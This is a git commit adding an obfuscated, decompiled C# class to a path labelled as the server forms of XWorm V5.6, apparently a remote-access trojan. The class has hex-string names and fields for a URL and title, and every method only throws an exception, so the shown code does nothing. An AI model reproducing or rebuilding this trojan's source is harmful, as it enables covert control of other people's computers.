bacc826729bbfe1468a76203ec8d8fbdc1621145
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:40 +0400

    Forms6.cs

---
+++ XWorm V5.6/Server/Forms/Forms6.cs
@@ -0,0 +1,40 @@
+﻿using M95F4E5MF7905418B3E7M3BBMCM33E92;
+using System;
+using System.IO;
+using System.Runtime.CompilerServices;
+
+namespace M5M4ACE9880C87DB29B8001A7A86E109
+{
+  internal class B1E6779174318578EBD948D91B1C51D2
+  {
+    public AsyncVoidMethodBuilder \u0024Builder;
+    internal byte[] \u0024VB\u0024Local_Data;
+    internal FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024Me;
+    internal object \u0024S0;
+    internal bool \u0024S1;
+    internal MemoryStream \u0024VB\u0024ResumableLocal_MS\u00242;
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sUrl() => throw new Exception("り");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sUrl(string AutoPropertyValue) => throw new Exception("ぐ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sTitle() => throw new Exception("く");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sTitle(string AutoPropertyValue) => throw new Exception("じ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public B1E6779174318578EBD948D91B1C51D2() => throw new Exception("ヸ");
+  }
+}
